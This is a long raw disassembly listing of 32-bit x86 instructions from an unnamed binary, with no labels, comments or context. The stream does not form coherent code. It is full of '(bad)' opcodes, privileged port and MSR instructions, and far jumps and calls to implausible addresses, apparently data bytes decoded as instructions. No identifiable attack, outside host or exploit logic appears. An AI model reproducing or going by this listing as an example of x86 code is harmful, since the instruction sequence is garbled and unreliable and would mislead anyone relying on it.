  4169e6:	inc    eax
  4169e7:	(bad)  
  4169e8:	jl     0x41698d
  4169ea:	mov    dl,0x2
  4169ec:	xor    eax,0xa36126fc
  4169f1:	sbb    BYTE PTR [ebx-0x6e],dh
  4169f4:	xor    esi,DWORD PTR [ebx]
  4169f6:	arpl   WORD PTR [ebx-0x25dc999d],dx
  4169fc:	dec    edi
  4169fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169fe:	imul   esp,DWORD PTR [eax-0x5c],0xfcc668a7
  416a05:	jmp    0x1f0e08fd
  416a0a:	jb     0x416a85
  416a0c:	fist   DWORD PTR [ebx]
  416a0e:	in     eax,dx
  416a0f:	push   0xffffff90
  416a11:	loop   0x416a8b
  416a13:	sbb    BYTE PTR [eax-0x745121f4],dl
  416a19:	push   eax
  416a1a:	dec    ebp
  416a1b:	aad    0x65
  416a1d:	nop    esi
  416a20:	aas    
  416a21:	in     eax,0x5d
  416a23:	arpl   WORD PTR [edx+eiz*2-0x9b1c651],dx
  416a2a:	lea    esp,ds:0xedbc2b8a
  416a30:	mov    bl,0x9e
  416a32:	imul   edi,DWORD PTR [edi],0xffffffac
  416a35:	test   ebx,0x34ca333d
  416a3b:	xor    ch,BYTE PTR [esi-0x6416d8ec]
  416a41:	push   0x448b8639
  416a46:	std    
  416a47:	adc    eax,0x70838ab1
  416a4c:	inc    ebx
  416a4d:	fldenv [edx-0x76]
  416a50:	(bad)  
  416a51:	cmp    BYTE PTR [ecx-0xfafd993],dl
  416a57:	sbb    BYTE PTR [edi-0x31],dh
  416a5a:	push   eax
  416a5b:	or     al,0xcc
  416a5d:	jle    0x416a2c
  416a5f:	scas   al,BYTE PTR es:[edi]
  416a60:	jnp    0x416a12
  416a62:	sub    DWORD PTR [ebp-0x1f],ebp
  416a65:	inc    esp
  416a66:	out    dx,eax
  416a67:	into   
  416a68:	xor    edi,DWORD PTR [edx-0x52]
  416a6b:	cs fdivp st(7),st
  416a6e:	rcl    DWORD PTR [edx],0xc8
  416a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a72:	inc    esp
  416a73:	xchg   ecx,eax
  416a74:	daa    
  416a75:	jl     0x416a02
  416a77:	scas   al,BYTE PTR es:[edi]
  416a78:	out    dx,al
  416a79:	(bad)  [edx-0x62a0cc28]
  416a7f:	mov    esi,ebp
  416a81:	mov    ebx,0x6434f4fd
  416a86:	int3   
  416a87:	loope  0x416ac8
  416a89:	std    
  416a8a:	or     BYTE PTR [edi-0x7c],bl
  416a8d:	hlt    
  416a8e:	adc    bh,BYTE PTR [edx+0x666ec63c]
  416a94:	sub    ecx,DWORD PTR [esi-0x5877ac9]
  416a9a:	fcomp  st(1)
  416a9c:	adc    edi,DWORD PTR [esi+0x7d]
  416a9f:	jns    0x416afb
  416aa1:	jmp    0xe437:0x45df7527
  416aa8:	add    eax,0xe177abcd
  416aad:	lods   al,BYTE PTR ds:[esi]
  416aae:	out    0xa2,eax
  416ab0:	and    BYTE PTR [edx+0x8bf0a02],bl
  416ab6:	mov    bl,0x9e
  416ab8:	fisttp DWORD PTR [esi+0x49]
  416abb:	cwde   
  416abc:	pmulhw mm4,QWORD PTR [ebx]
  416abf:	fimul  DWORD PTR [eax]
  416ac1:	mov    ds:0x9425ebb5,al
  416ac6:	and    eax,DWORD PTR [edi]
  416ac8:	mov    DWORD PTR [eax-0x4],esp
  416acb:	xor    al,0x76
  416acd:	xchg   edx,eax
  416ace:	or     BYTE PTR [edx],dh
  416ad0:	dec    esp
  416ad1:	in     al,0x6
  416ad3:	retf   
  416ad4:	dec    edi
  416ad5:	repz push ecx
  416ad7:	cmc    
  416ad8:	bswap  edi
  416ada:	jmp    0x7a328740
  416adf:	mov    bh,0x62
  416ae1:	lods   al,BYTE PTR ds:[esi]
  416ae2:	cmp    eax,0x365bbb99
  416ae7:	mov    ebx,DWORD PTR [esi-0x3c]
  416aea:	mov    al,ds:0x5aa4e115
  416aef:	jo     0x416b2b
  416af1:	jae    0x416b50
  416af3:	push   edi
  416af4:	rol    ebp,cl
  416af6:	mov    ?,WORD PTR [eax-0x199c7342]
  416afc:	ficom  DWORD PTR [ebp-0x4fbba1ba]
  416b02:	pop    esp
  416b03:	mov    al,ds:0x71f9922d
  416b08:	ret    0x8251
  416b0b:	aas    
  416b0c:	int    0xf9
  416b0e:	in     eax,dx
  416b0f:	stos   BYTE PTR es:[edi],al
  416b10:	and    eax,0xdfcb8402
  416b15:	ins    DWORD PTR es:[edi],dx
  416b16:	enter  0x97e1,0x72
  416b1a:	xchg   esi,eax
  416b1b:	(bad)  
  416b1c:	loopne 0x416ae6
  416b1e:	repz les ebx,FWORD PTR [edi-0x5a]
  416b22:	jb     0x416b23
  416b24:	sar    BYTE PTR [edx],0x41
  416b27:	sub    DWORD PTR [edx-0x67],edi
  416b2a:	dec    eax
  416b2b:	mov    eax,0x795f2d1f
  416b30:	or     eax,0x697f0c13
  416b35:	push   ebx
  416b36:	pusha  
  416b37:	jae    0x416b58
  416b39:	dec    ebx
  416b3a:	jno    0x416b8e
  416b3c:	xchg   esp,eax
  416b3d:	push   ebx
  416b3e:	test   al,0x9e
  416b40:	out    dx,al
  416b41:	es rcr ecx,cl
  416b44:	push   0xffffffc3
  416b46:	add    BYTE PTR [edi],dl
  416b48:	fsub   st(2),st
  416b4a:	mov    ch,0xc6
  416b4c:	outs   dx,BYTE PTR ds:[esi]
  416b4d:	leave  
  416b4e:	not    BYTE PTR [edi+0x37]
  416b51:	test   BYTE PTR [ebx],ah
  416b53:	add    al,BYTE PTR [edx]
  416b55:	dec    edi
  416b56:	scas   al,BYTE PTR es:[edi]
  416b57:	xchg   esp,eax
  416b58:	mov    BYTE PTR [edi+0x661d7892],bh
  416b5e:	(bad)  
  416b5f:	sbb    BYTE PTR [eax-0x7d22a15c],ch
  416b65:	(bad)  
  416b67:	jmp    0x5ef056ff
  416b6c:	xlat   BYTE PTR ds:[ebx]
  416b6d:	xchg   edi,eax
  416b6e:	cmovge esi,DWORD PTR ds:0xc7589d01
  416b75:	hlt    
  416b76:	sbb    eax,0xabf8687
  416b7b:	int3   
  416b7c:	mov    ebx,0xa38e4f68
  416b81:	in     al,0x3a
  416b83:	jp     0x416b3b
  416b85:	repz (bad) 
  416b87:	fisubr WORD PTR [ebx+0x27]
  416b8a:	push   ss
  416b8b:	(bad)  
  416b8c:	and    eax,0x20adde77
  416b91:	sbb    BYTE PTR [ecx],ch
  416b93:	jle    0x416ba4
  416b95:	ins    BYTE PTR es:[edi],dx
  416b96:	(bad)  
  416b97:	xor    ah,ah
  416b99:	scas   al,BYTE PTR es:[edi]
  416b9a:	enter  0x4425,0xfc
  416b9e:	cmp    bl,BYTE PTR [esp+ebx*8+0x733e7e72]
  416ba5:	clc    
  416ba6:	jecxz  0x416c13
  416ba8:	add    BYTE PTR [edx-0x768e476d],dh
  416bae:	adc    bl,BYTE PTR [esi]
  416bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb1:	and    DWORD PTR [ebx],ebx
  416bb3:	test   DWORD PTR [edx-0x5d7f4a71],ecx
  416bb9:	xchg   edi,eax
  416bba:	fwait
  416bbb:	inc    edi
  416bbc:	xchg   ecx,eax
  416bbd:	inc    ecx
  416bbe:	fist   DWORD PTR [ebx+0x6d5ecc8]
  416bc4:	(bad)  
  416bc5:	xor    bl,BYTE PTR [esi+ebp*4-0x40]
  416bc9:	xchg   ebx,eax
  416bca:	jmp    0xe977:0xcccb535d
  416bd1:	je     0x416b7b
  416bd3:	adc    edi,DWORD PTR [ebx+0x7bc330f1]
  416bd9:	jae    0x416b83
  416bdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bdc:	addr16 sub eax,0xf19256c8
  416be2:	stos   BYTE PTR es:[edi],al
  416be3:	sub    bh,BYTE PTR ds:0xa45de985
  416be9:	xlat   BYTE PTR ds:[ebx]
  416bea:	mov    bl,BYTE PTR [ebx-0x7c]
  416bed:	sbb    esp,esi
  416bef:	dec    esi
  416bf0:	jb     0x416bd1
  416bf2:	xchg   esp,eax
  416bf3:	adc    bl,BYTE PTR [esi-0x734d337d]
  416bf9:	or     DWORD PTR [ecx-0x37],edx
  416bfc:	js     0x416b9c
  416bfe:	mov    ecx,0x99f545a4
  416c03:	xchg   ebx,eax
  416c04:	pusha  
  416c05:	sti    
  416c06:	pop    esp
  416c07:	pusha  
  416c08:	mov    bl,0x8c
  416c0a:	or     eax,0x6fd35def
  416c0f:	jnp    0x416b95
  416c11:	outs   dx,BYTE PTR ds:[esi]
  416c12:	or     al,BYTE PTR [ebx]
  416c14:	ss mov esi,0x141b5d2d
  416c1a:	jl     0x416c14
  416c1c:	or     DWORD PTR [edx-0x13],ebx
  416c1f:	inc    esp
  416c20:	xchg   edx,eax
  416c21:	add    cl,BYTE PTR [ebx+0x23]
  416c24:	adc    DWORD PTR [ebx],ebp
  416c26:	bound  ebx,QWORD PTR [edi]
  416c28:	sbb    dh,BYTE PTR [ebx+0x10]
  416c2b:	jmp    0xa4ca:0x47fbddec
  416c32:	ret    
  416c33:	push   0x3b
  416c35:	xchg   BYTE PTR [edi+0x7d95de8e],cl
  416c3b:	popf   
  416c3c:	or     al,0xb6
  416c3e:	cmp    eax,0x86c7be9d
  416c43:	fmul   st,st(0)
  416c45:	inc    edx
  416c46:	inc    ecx
  416c47:	xchg   BYTE PTR ds:[ebx+0x94bb923],ch
  416c4e:	ret    0x62f5
  416c51:	sti    
  416c52:	dec    ebx
  416c53:	sub    ah,BYTE PTR [edx]
  416c55:	jo     0x416c8d
  416c57:	xsavec [ebp+0x45b3c50a]
  416c5e:	sub    eax,0x4331d9b8
  416c63:	and    ebx,DWORD PTR [ebp+0x25297ce3]
  416c69:	or     DWORD PTR [edx+0x698518fa],eax
  416c6f:	dec    ebp
  416c70:	wrmsr  
  416c72:	sbb    edi,DWORD PTR [esi+0x32]
  416c75:	mov    ds:0xb9f780a9,al
  416c7a:	rcl    DWORD PTR [eax],0x67
  416c7d:	sub    dl,BYTE PTR [ebx-0x4]
  416c80:	fidiv  WORD PTR [edx-0x525c572d]
  416c86:	pushf  
  416c87:	in     eax,dx
  416c88:	cmp    edx,DWORD PTR [eax]
  416c8a:	ror    edx,0xb9
  416c8d:	loope  0x416cb8
  416c8f:	pop    edx
  416c90:	adc    DWORD PTR [eax-0x5b],0xffffffd6
  416c94:	call   0x7321dfd8
  416c99:	fcmovu st,st(1)
  416c9b:	fldenv ds:0x71a49780
  416ca1:	or     BYTE PTR [ecx-0x3829d92c],dl
  416ca7:	sbb    DWORD PTR [ebp+0x53fda9f3],ebp
  416cad:	pop    ss
  416cae:	neg    DWORD PTR [ecx]
  416cb0:	and    ah,BYTE PTR [esi+edi*8]
  416cb3:	dec    eax
  416cb4:	pop    eax
  416cb5:	jo     0x416c9d
  416cb7:	mov    eax,ds:0x978caeb1
  416cbc:	jmp    FWORD PTR [esi+0x70]
  416cbf:	cmc    
  416cc0:	ja     0x416cf7
  416cc2:	sbb    eax,0x34595b9
  416cc7:	jmp    0x416cb5
  416cc9:	mov    ds:0xe7170e82,al
  416cce:	pop    edx
  416ccf:	test   dl,dh
  416cd1:	daa    
  416cd2:	push   ss
  416cd3:	sub    ah,dh
  416cd5:	adc    BYTE PTR [ebp+0x56],dl
  416cd8:	cmp    DWORD PTR [eax-0x4d],esp
  416cdb:	in     al,dx
  416cdc:	jnp    0x416cec
  416cde:	mov    BYTE PTR [eax-0x4f3ddf21],ch
  416ce4:	push   ebp
  416ce5:	test   DWORD PTR [eax+0x41],edx
  416ce8:	push   ebx
  416ce9:	jmp    0x416c99
  416ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cec:	push   ss
  416ced:	in     al,0x6b
  416cef:	lahf   
  416cf0:	sub    BYTE PTR ds:0xbd808f1a,dl
  416cf6:	nop
  416cf7:	pop    ecx
  416cf8:	aam    0xc7
  416cfa:	jb     0x416cce
  416cfc:	repz dec esi
  416cfe:	jl     0x416d27
  416d00:	sti    
  416d01:	pop    ecx
  416d02:	nop
  416d03:	jmp    0x591c2cb3
  416d08:	test   al,0x9
  416d0a:	cmp    al,0xb4
  416d0c:	lea    edi,ds:0xf0cb0c7
  416d12:	nop
  416d13:	out    dx,eax
  416d14:	or     ah,BYTE PTR [ecx]
  416d16:	lods   eax,DWORD PTR ds:[esi]
  416d17:	cdq    
  416d18:	mov    esi,0xbd15bc2f
  416d1d:	aad    0x29
  416d1f:	xchg   ebp,eax
  416d20:	inc    eax
  416d21:	sbb    al,ah
  416d23:	jp     0x416cb2
  416d25:	jle    0x416cdc
  416d27:	xlat   BYTE PTR ds:[ebx]
  416d28:	lahf   
  416d29:	ins    BYTE PTR es:[edi],dx
  416d2a:	mov    esp,0x683f0d80
  416d2f:	rcl    edx,1
  416d31:	mov    eax,0xd2c23012
  416d36:	data16 shr BYTE PTR [ebp-0x2dc226d5],1
  416d3d:	outs   dx,BYTE PTR ds:[esi]
  416d3e:	pop    ds
  416d3f:	pop    esi
  416d40:	jno    0x416d97
  416d42:	xor    BYTE PTR [ecx+eax*2-0x80],cl
  416d46:	mov    dh,0xcc
  416d48:	and    BYTE PTR [edi],bl
  416d4a:	add    bh,bh
  416d4c:	call   0x3ecb:0xb6b78dd8
  416d53:	xchg   esp,eax
  416d54:	push   ss
  416d55:	mov    ebx,DWORD PTR [ebx]
  416d57:	inc    ebp
  416d58:	mov    bl,0xd2
  416d5a:	jno    0x416d5a
  416d5c:	push   es
  416d5d:	jl     0x416dd3
  416d5f:	les    ecx,FWORD PTR [ebp+0x17e97772]
  416d65:	movd   DWORD PTR [ebx-0x4c],mm4
  416d69:	fst    QWORD PTR [eax+0x2a80550d]
  416d6f:	cmp    eax,0xca7783e5
  416d74:	mov    dh,0xfc
  416d76:	scas   eax,DWORD PTR es:[edi]
  416d77:	mov    bh,0xdd
  416d79:	addr16 push 0x23
  416d7c:	out    dx,al
  416d7d:	test   al,0x23
  416d7f:	js     0x416dd6
  416d81:	mov    ch,0xcc
  416d83:	sahf   
  416d84:	test   DWORD PTR [esi-0x58],eax
  416d87:	lds    edx,FWORD PTR ds:0x33974af9
  416d8d:	mov    BYTE PTR [eax],ch
  416d8f:	int    0xbf
  416d91:	pop    ebx
  416d92:	mov    eax,0x90240bb5
  416d97:	ret    
  416d98:	pop    ds
  416d99:	outs   dx,BYTE PTR ds:[esi]
  416d9a:	addr16 push 0xfffffff3
  416d9d:	mov    edi,0x18cd1615
  416da2:	imul   edi,edx,0x3d
  416da5:	pop    edi
  416da6:	jo     0x416d6a
  416da8:	mov    ecx,0xea99184a
  416dad:	mov    esp,DWORD PTR ds:0xb3e18d62
  416db3:	mov    edx,DWORD PTR [ebp*8-0x2dca248f]
  416dba:	inc    edi
  416dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dbc:	jno    0x416df0
  416dbe:	sub    al,0xe2
  416dc0:	mov    ecx,0xfe4b9502
  416dc5:	jns    0x416dc9
  416dc7:	test   eax,0xbcdc8399
  416dcc:	push   0xe77ad12f
  416dd1:	jnp    0x416d72
  416dd3:	cmp    DWORD PTR [ebx+0x2],ecx
  416dd6:	push   esp
  416dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dd8:	sbb    edx,DWORD PTR [ecx+ecx*2-0x34]
  416ddc:	add    al,BYTE PTR [ebp+esi*1-0x40b3a6da]
  416de3:	fs cmp al,0x5b
  416de6:	and    ebp,DWORD PTR [esi-0x12]
  416de9:	push   edi
  416dea:	hlt    
  416deb:	xor    al,0xee
  416ded:	mov    fs,WORD PTR [esp+edi*4]
  416df0:	iret   
  416df1:	xor    ax,dx
  416df4:	or     esi,ebx
  416df6:	push   edx
  416df7:	mov    bl,0x9d
  416df9:	pushf  
  416dfa:	ret    
  416dfb:	mov    al,0x47
  416dfd:	retf   0xc47e
  416e00:	push   es
  416e01:	rol    DWORD PTR [eax],1
  416e03:	cdq    
  416e04:	in     al,dx
  416e05:	and    bh,BYTE PTR [ebp-0x59]
  416e08:	ds popf 
  416e0a:	cmc    
  416e0b:	dec    esp
  416e0c:	pop    eax
  416e0d:	push   es
  416e0e:	dec    edx
  416e0f:	or     BYTE PTR [esi-0x3c73aa88],ch
  416e15:	dec    edi
  416e16:	mov    ebx,0xb2233905
  416e1b:	stos   DWORD PTR es:[edi],eax
  416e1c:	ins    DWORD PTR es:[edi],dx
  416e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e1e:	mov    edi,0xbfd29dc7
  416e23:	jne    0x416ded
  416e25:	or     al,0xab
  416e27:	add    esp,DWORD PTR ds:0xc135700c
  416e2d:	test   BYTE PTR [esi-0x645a31b5],0xbc
  416e34:	pop    es
  416e35:	sub    BYTE PTR [eax+0x54],0xac
  416e39:	mov    dh,0x96
  416e3b:	(bad)  
  416e3c:	mov    dh,0xb2
  416e3e:	fdiv   st(4),st
  416e40:	aas    
  416e41:	rcl    DWORD PTR [edi-0x2d22b662],cl
  416e47:	div    BYTE PTR [esi]
  416e49:	test   al,0x9e
  416e4b:	xchg   ebp,eax
  416e4c:	inc    edx
  416e4d:	mov    ecx,DWORD PTR [eax]
  416e4f:	mov    esp,0x4ec843f8
  416e54:	and    eax,0x419fa1d2
  416e59:	xor    dh,al
  416e5b:	add    DWORD PTR [edx-0x50],ebx
  416e5e:	jmp    0x6b8d:0xe3fa8c58
  416e65:	scas   eax,DWORD PTR es:[edi]
  416e66:	sahf   
  416e67:	adc    DWORD PTR [ebx+0x6d],ecx
  416e6a:	sub    esp,DWORD PTR [edx-0x20cd1d85]
  416e70:	jg     0x416ecd
  416e72:	and    cl,BYTE PTR [ebx+0x38]
  416e75:	cmp    al,0x8c
  416e77:	inc    edx
  416e78:	aad    0x91
  416e7a:	mov    ds:0x977699f1,al
  416e7f:	mov    DWORD PTR fs:[edx],eax
  416e82:	repz ret 
  416e84:	and    al,0xbf
  416e86:	dec    ecx
  416e87:	sahf   
  416e88:	mov    bl,0xe7
  416e8a:	aam    0xd9
  416e8c:	jns    0x416ea3
  416e8e:	jmp    0x46a7:0xd06317b2
  416e95:	sub    al,0x2b
  416e97:	ins    DWORD PTR es:[edi],dx
  416e98:	xor    cl,al
  416e9a:	mov    ebp,0xfb1a08af
  416e9f:	jl     0x416e5e
  416ea1:	sbb    BYTE PTR [edi+0x54],ah
  416ea4:	int    0xcb
  416ea6:	inc    esi
  416ea7:	or     DWORD PTR [esi+edx*4],edx
  416eaa:	ins    BYTE PTR es:[edi],dx
  416eab:	repnz mov dh,0xeb
  416eae:	mov    al,0x7f
  416eb0:	or     ecx,DWORD PTR [edx+0x5b]
  416eb3:	dec    esp
  416eb4:	gs leave 
  416eb6:	das    
  416eb7:	call   FWORD PTR [ebx+0x48]
  416eba:	push   0xf30f95b9
  416ebf:	push   cs
  416ec0:	push   eax
  416ec1:	cmc    
  416ec2:	pop    edi
  416ec3:	mov    ds:0x301a19a4,al
  416ec8:	mov    ch,cl
  416eca:	push   esi
  416ecb:	add    al,0xc6
  416ecd:	pop    ebx
  416ece:	xor    DWORD PTR [esi-0x1b],ebp
  416ed1:	mov    ebp,0xa00ca93c
  416ed6:	pop    edx
  416ed7:	fisub  DWORD PTR [eax]
  416ed9:	cdq    
  416eda:	pop    ebp
  416edb:	loopne 0x416f50
  416edd:	arpl   WORD PTR [edi],bx
  416edf:	pop    ebp
  416ee0:	and    eax,esp
  416ee2:	dec    eax
  416ee3:	int    0x21
  416ee5:	les    esp,FWORD PTR [ecx+eiz*4-0x41]
  416ee9:	xchg   ebx,eax
  416eea:	mov    ch,0xd9
  416eec:	mov    dh,0xbb
  416eee:	adc    esi,esi
  416ef0:	call   0x38c4:0x7aee3861
  416ef7:	sahf   
  416ef8:	jno    0x416f6b
  416efa:	scas   al,BYTE PTR es:[edi]
  416efb:	enter  0x2863,0x3f
  416eff:	lods   al,BYTE PTR ds:[esi]
  416f00:	les    edx,FWORD PTR [ecx+0x34]
  416f03:	push   0x17
  416f05:	ss inc edi
  416f07:	pushf  
  416f08:	or     bl,cl
  416f0a:	enter  0xa714,0x5f
  416f0e:	push   edx
  416f0f:	inc    ebp
  416f10:	scas   al,BYTE PTR es:[edi]
  416f11:	pop    es
  416f12:	sbb    BYTE PTR [ecx],0x52
  416f15:	push   0xae1f3e3b
  416f1a:	lock pop es
  416f1c:	(bad)  
  416f1d:	xlat   BYTE PTR ds:[ebx]
  416f1e:	xor    ebp,ebx
  416f20:	and    eax,0xae11a3bc
  416f25:	inc    ebx
  416f26:	popf   
  416f27:	ins    BYTE PTR es:[edi],dx
  416f28:	lods   al,BYTE PTR ds:[esi]
  416f29:	and    ch,BYTE PTR [esi+0x3c]
  416f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f2d:	cmp    al,0x5a
  416f2f:	mov    BYTE PTR [edx+ebp*2+0x51],0xd2
  416f34:	push   edi
  416f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f36:	fisub  WORD PTR [edx+eax*1-0x6c7d1aba]
  416f3d:	test   eax,0x1afb8813
  416f42:	or     BYTE PTR [eax],ch
  416f44:	mov    ecx,0x65f2fc22
  416f49:	add    BYTE PTR [eiz*1+0x1a2e167],dh
  416f50:	imul   edi,DWORD PTR [ebp-0x58],0x71cffe4a
  416f57:	or     BYTE PTR [edi],dh
  416f59:	and    dh,BYTE PTR [edx]
  416f5b:	lods   al,BYTE PTR ds:[esi]
  416f5c:	xor    DWORD PTR [ebp+0x9],ecx
  416f5f:	sub    eax,0xa714b3d2
  416f64:	add    DWORD PTR [edx+edi*1+0x13],0xffffffef
  416f69:	and    ebx,DWORD PTR [ebp+0x63e20c5d]
  416f6f:	dec    edi
  416f70:	push   ss
  416f71:	xor    al,0xf4
  416f73:	adc    esi,0xa66e9247
  416f79:	xchg   ebp,eax
  416f7a:	pop    edi
  416f7b:	cs iret 
  416f7d:	mov    esp,0xaa81d452
  416f82:	add    al,0x1c
  416f84:	into   
  416f85:	mov    ds:0x798654ed,al
  416f8a:	pop    eax
  416f8b:	popa   
  416f8c:	popa   
  416f8d:	jno    0x416fe5
  416f8f:	leave  
  416f90:	and    eax,0x5726cad6
  416f95:	leave  
  416f96:	(bad)  
  416f97:	jb     0x416fa4
  416f99:	push   esp
  416f9a:	bnd jbe 0x417010
  416f9d:	leave  
  416f9e:	sbb    BYTE PTR [edx],0xfc
  416fa1:	lahf   
  416fa2:	ss push ds
  416fa4:	inc    esi
  416fa5:	loopne 0x416ff6
  416fa7:	mov    dh,0xb7
  416fa9:	cmp    esi,DWORD PTR [esi-0x10]
  416fac:	cwde   
  416fad:	mov    edx,0xa323586e
  416fb2:	push   ebx
  416fb3:	iret   
  416fb4:	jg     0x416f38
  416fb6:	mov    edi,0xf89cf603
  416fbb:	das    
  416fbc:	pop    edi
  416fbd:	pop    edi
  416fbe:	mov    esi,0x8d359f02
  416fc3:	adc    bh,BYTE PTR [ebx]
  416fc5:	rcr    DWORD PTR [eax+0x7c5e1f81],1
  416fcb:	std    
  416fcc:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  416fce:	inc    edi
  416fcf:	fs jg  0x416f57
  416fd2:	cmp    ecx,esp
  416fd4:	push   0xae8fc878
  416fd9:	jp     0x417026
  416fdb:	loope  0x416fe8
  416fdd:	jecxz  0x416f79
  416fdf:	inc    ebp
  416fe0:	mov    bh,0xa7
  416fe2:	pop    ebp
  416fe3:	push   ebp
  416fe4:	sbb    dh,BYTE PTR [edx+0x2f0292b0]
  416fea:	lea    eax,[ebp-0xa]
  416fed:	jmp    0x416f88
  416fef:	lea    edi,ds:0xa741707a
  416ff5:	mov    dl,0xc
  416ff7:	out    0xf6,al
  416ff9:	fidiv  DWORD PTR [esi]
  416ffb:	inc    esi
  416ffc:	jge    0x416fd5
  416ffe:	push   ecx
  416fff:	retf   
  417000:	xchg   esi,eax
  417001:	push   edx
  417002:	push   cs
  417003:	jmp    0x416f9d
  417005:	mov    bl,BYTE PTR gs:[edi+0x79]
  417009:	or     BYTE PTR [edx+0x590bd578],al
  41700f:	call   0x47d3:0xcedc3d29
  417016:	add    BYTE PTR [ebp-0x52],bh
  417019:	mov    dh,0x8a
  41701b:	add    al,0xdb
  41701d:	pop    edx
  41701e:	pop    DWORD PTR [esi+0x2b81068e]
  417024:	sti    
  417025:	mov    ebp,0xc831ee85
  41702a:	mov    ebp,0x7c988bb3
  41702f:	enter  0xa4e4,0x1f
  417033:	cmc    
  417034:	mov    ax,ds:0x887748dd
  41703a:	imul   ebx,DWORD PTR [ecx],0x1
  41703d:	ret    0xb957
  417040:	repz shl al,0xe8
  417044:	aas    
  417045:	xchg   edx,eax
  417046:	jno    0x417073
  417048:	mov    ch,ch
  41704a:	lods   al,BYTE PTR ds:[esi]
  41704b:	fbstp  TBYTE PTR [edi-0x5c]
  41704e:	sbb    eax,esp
  417050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417051:	and    eax,0x87463555
  417056:	mov    dh,0xb8
  417058:	mov    esp,0x1061fa47
  41705d:	js     0x417058
  41705f:	and    al,0x70
  417061:	xchg   DWORD PTR [edi+0x2de85c4c],esi
  417067:	test   BYTE PTR ds:0x5d9ef987,dh
  41706d:	fstp   TBYTE PTR [ecx+0x48]
  417070:	addr16 jl 0x41706f
  417073:	sub    al,0x7f
  417075:	mov    al,0x71
  417077:	das    
  417078:	xor    BYTE PTR [edi],dh
  41707a:	or     DWORD PTR [esi-0x3b],ecx
  41707d:	cdq    
  41707e:	add    BYTE PTR [edx+0x72],ch
  417081:	sub    al,0xbb
  417083:	bound  esp,QWORD PTR [edx-0x27]
  417086:	call   0xe3e5:0xab9df506
  41708d:	or     DWORD PTR [ecx+esi*8-0x3c],0x55a396ae
  417095:	jne    0x417086
  417097:	enter  0x68ca,0xad
  41709b:	mov    WORD PTR [edx],ss
  41709d:	int3   
  41709e:	inc    esp
  41709f:	jbe    0x417072
  4170a1:	das    
  4170a2:	cmp    dh,BYTE PTR [esi-0x23]
  4170a5:	jnp    0x417059
  4170a7:	and    eax,0x95c3a455
  4170ac:	cmp    al,0x27
  4170ae:	cdq    
  4170af:	fucomip st,st(0)
  4170b1:	sub    BYTE PTR [edi],bh
  4170b3:	pop    es
  4170b4:	xrelease xchg BYTE PTR [ebx],dl
  4170b7:	add    dh,BYTE PTR [ecx+0x7f]
  4170ba:	nop
  4170bb:	adc    bh,BYTE PTR [edi+0x18]
  4170be:	leave  
  4170bf:	mov    bh,0xa4
  4170c1:	cmp    DWORD PTR es:[esi],edi
  4170c4:	dec    esp
  4170c5:	std    
  4170c6:	hlt    
  4170c7:	bnd ret 
  4170c9:	adc    bh,ah
  4170cb:	pop    ebx
  4170cc:	jae    0x4170e4
  4170ce:	pushf  
  4170cf:	or     BYTE PTR [eax-0x290c5680],0xfe
  4170d6:	mov    BYTE PTR [ecx],ah
  4170d8:	push   es
  4170d9:	push   0xfffffff8
  4170db:	push   ss
  4170dc:	inc    edi
  4170dd:	pop    es
  4170de:	scas   eax,DWORD PTR es:[edi]
  4170df:	fwait
  4170e0:	xchg   esi,eax
  4170e1:	mov    DWORD PTR [edx+0x3],esi
  4170e4:	(bad)  
  4170e5:	inc    DWORD PTR [edi+ebx*2+0x462d60a4]
  4170ec:	out    dx,al
  4170ed:	mov    ds:0x3688a119,al
  4170f2:	adc    al,0xf3
  4170f4:	xchg   esi,eax
  4170f5:	xor    bh,BYTE PTR [esi+0x5c]
  4170f8:	pop    edi
  4170f9:	cmp    BYTE PTR [edx],bh
  4170fb:	mov    ecx,0xf5d2e8ec
  417100:	push   esi
  417101:	push   cs
  417102:	jmp    0x50ac5d37
  417107:	push   esi
  417108:	loop   0x41714b
  41710a:	push   edi
  41710b:	mov    esi,0xc31fe0b
  417110:	lahf   
  417111:	cmp    esi,DWORD PTR [edi-0x3]
  417114:	aam    0xf
  417116:	jmp    0xff23bca5
  41711b:	pop    es
  41711c:	xchg   esp,eax
  41711d:	xor    DWORD PTR [edx],edx
  41711f:	or     eax,0x4426a154
  417124:	int3   
  417125:	inc    eax
  417126:	xchg   edx,eax
  417127:	inc    esp
  417128:	xlat   BYTE PTR ds:[ebx]
  417129:	stos   BYTE PTR es:[edi],al
  41712a:	outs   dx,DWORD PTR ds:[esi]
  41712b:	hlt    
  41712c:	xor    edi,edi
  41712e:	sub    eax,0x76d49872
  417133:	into   
  417134:	addr16 int 0xee
  417137:	loope  0x4170c5
  417139:	out    0x60,eax
  41713b:	outs   dx,BYTE PTR ds:[esi]
  41713c:	scas   eax,DWORD PTR es:[edi]
  41713d:	loopne 0x4170e2
  41713f:	inc    eax
  417140:	aad    0x35
  417142:	inc    ebx
  417143:	test   BYTE PTR [eax],ah
  417145:	ret    0xd509
  417148:	call   0xd582a149
  41714d:	cs (bad) 
  41714f:	outs   dx,DWORD PTR ds:[esi]
  417150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417151:	pop    eax
  417152:	xchg   ebx,eax
  417153:	lea    esp,[ebp+0x4c329271]
  417159:	mov    al,ds:0xe070080e
  41715e:	add    ch,BYTE PTR [ebx+0x31]
  417161:	pop    edx
  417162:	lods   eax,DWORD PTR ds:[esi]
  417163:	xor    BYTE PTR [edx],cl
  417165:	cs cmp dh,ah
  417168:	or     DWORD PTR [edi-0xb6c4e8a],esp
  41716e:	mov    eax,0x16786e9c
  417173:	les    eax,FWORD PTR [eax+0x24256aba]
  417179:	jg     0x4171a3
  41717b:	push   esp
  41717c:	jmp    0x2d606e6e
  417181:	push   edx
  417182:	fimul  DWORD PTR [edx-0x58]
  417185:	add    al,0x1c
  417187:	push   0x6b
  417189:	jno    0x417149
